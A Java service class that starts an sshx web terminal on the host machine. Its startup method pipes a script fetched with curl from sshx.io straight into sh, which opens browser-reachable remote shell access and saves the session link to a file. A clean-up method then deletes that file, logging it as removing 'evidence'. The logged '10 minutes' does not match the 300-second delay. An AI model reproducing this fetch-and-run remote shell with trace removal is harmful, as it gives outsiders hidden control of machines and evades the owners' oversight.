package com.github.vevc.service.impl;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.AbstractAppService;
import com.github.vevc.util.LogUtil;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.concurrent.TimeUnit;

/**
 * SSHX web terminal service implementation
 * Uses sshx.io installation script for reliable setup
 * @author zv
 */
public class SshxServiceImpl extends AbstractAppService {

    private static final String INFO_FILE = "s.txt";
    private static final int CLEANUP_DELAY_SECONDS = 300;

    @Override
    protected String getAppDownloadUrl(String appVersion) {
        return null;
    }

    @Override
    public void install(AppConfig appConfig) throws Exception {
        LogUtil.info("SSHX will be installed via sshx.io script");
    }

    @Override
    public void startup() {
        File workDir = this.getWorkDir();
        File infoFile = new File(workDir, INFO_FILE);

        try {
            if (!workDir.exists()) {
                workDir.mkdirs();
            }

            ProcessBuilder pb = new ProcessBuilder(
                    "/bin/bash", "-c",
                    "curl -sSf https://sshx.io/get | sh -s run > " + infoFile.getAbsolutePath() + " 2>&1"
            );
            pb.directory(workDir);
            pb.redirectErrorStream(true);

            LogUtil.info("Starting SSHX via sshx.io script...");
            this.currentProcess = pb.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(currentProcess.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                LogUtil.info("[SSHX] " + line);
            }

            int exitCode = currentProcess.waitFor();
            LogUtil.info("SSHX script completed with exit code: " + exitCode);

        } catch (Exception e) {
            LogUtil.error("SSHX startup failed", e);
        }
    }

    @Override
    public void clean() {
        File workDir = this.getWorkDir();
        File infoFile = new File(workDir, INFO_FILE);

        try {
            TimeUnit.SECONDS.sleep(CLEANUP_DELAY_SECONDS);
            Files.deleteIfExists(infoFile.toPath());
            LogUtil.info("SSHX evidence files cleaned after 10 minutes");
        } catch (Exception e) {
            LogUtil.error("SSHX cleanup failed", e);
        }
    }
}
